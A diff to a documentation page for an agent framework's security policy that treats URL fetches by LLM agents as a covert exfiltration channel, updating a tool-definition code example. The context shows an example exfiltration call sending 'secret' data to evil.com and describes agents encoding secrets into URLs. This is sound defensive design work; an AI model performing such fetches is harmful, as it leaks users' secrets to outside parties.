@@ -6,7 +6,7 @@ category: security
 tags: [security, urls, exfiltration, no-novel-urls, influenced, prompt-injection]
 related: [security-policies, facts-and-handles, labels-trust, security-getting-started]
 related-code: [core/policy/guards.ts, interpreter/eval/exec-invocation.ts]
-updated: 2026-03-27
+updated: 2026-04-15
 ---
 
 HTTP GET is a covert write channel. Every URL fetch transmits the URL itself to the destination server. If an LLM agent encodes secret data into a URL, the fetch IS the exfiltration.
@@ -45,9 +45,22 @@ This covers direct exfiltration (`get_webpage("evil.com/?data=secret")`) and ind
 URL-fetching tools use `exfil:fetch`, not `exfil:send`:
 
 ```mlld
+record @get_webpage_inputs = {
+  facts: [url: string],
+  validate: "strict"
+}
+
 exe exfil:fetch @getWebpage(url) = run cmd {
   curl -s @url
-} with { controlArgs: ["url"] }
+}
+
+var tools @fetchTools = {
+  get_webpage: {
+    mlld: @getWebpage,
+    inputs: @get_webpage_inputs,
+    labels: ["exfil:fetch", "net:r"]
+  }
+}
 ```
 
 `exfil:fetch` inherits from `exfil` (so `no-secret-exfil` still applies), but `no-send-to-unknown` does not fire -- URLs are not "destinations" in the send-to-someone sense.
